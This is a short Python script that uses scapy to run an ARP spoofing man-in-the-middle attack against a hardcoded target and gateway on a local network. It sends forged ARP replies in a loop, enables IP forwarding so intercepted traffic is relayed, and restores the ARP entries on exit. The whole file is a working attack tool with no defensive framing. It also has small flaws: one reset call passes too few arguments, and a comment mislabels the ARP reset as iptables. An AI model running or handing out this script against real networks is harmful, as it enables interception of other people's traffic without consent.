from scapy.all import *
import time

from scapy.layers.l2 import Ether, ARP


def get_mac(ip):
    req = ARP(pdst=ip)
    # ff:ff:ff:ff:ff:ff = broadcast
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broadcast = broadcast / req
    # srp stands for send and receive packet.
    res = srp(req_broadcast, timeout=1, verbose=False)[0]
    if len(res) > 0 and len(res[0]) > 0:
        return res[0][1].hwsrc
    else:
        return None


def spoof(target, gateway):
    mac_t = get_mac(target)
    mac_g = get_mac(gateway)
    try:
        print("spoofing... press CTRL + C to stop")
        while True:
            if mac_t is None:
                print("Invalid target address.")
                raise ValueError
            if mac_g is None:
                print("Invalid gateway address.")
                raise ValueError
            # sending the arp req to the gateway saying that the target has my mac
            send(ARP(op=2, pdst=gateway, hwdst=mac_g, psrc=target), verbose=False)
            # sending the arp req to the target saying that the gateway has my mac
            send(ARP(op=2, pdst=target, hwdst=mac_t, psrc=gateway), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nstopping...")
        reset(target, gateway, mac_t, mac_g)


# reset the iptables
def reset(target, gateway, mac_t, mac_g):
    send(ARP(op=2, pdst=gateway, hwdst=mac_g, psrc=target, hwsrc=mac_t), verbose=False)
    send(ARP(op=2, pdst=target, hwdst=mac_t, psrc=gateway, hwsrc=mac_g), verbose=False)


def enable_ip_forwarding():
    file = open('/proc/sys/net/ipv4/ip_forward', 'w')  # or 'a' to add text instead of truncate
    file.write('1')
    file.close()


def disable_ip_forwarding():
    file = open('/proc/sys/net/ipv4/ip_forward', 'w')  # or 'a' to add text instead of truncate
    file.write('0')
    file.close()


def main():
    target_ip = "192.168.1.41"
    gateway = "192.168.1.1"

    # enable ip forward
    enable_ip_forwarding()
    # spoof
    try:
        spoof(target_ip, gateway)
    except (ValueError, KeyboardInterrupt):
        reset(target_ip, gateway)
        return


main()
# disable ip forward
disable_ip_forwarding()
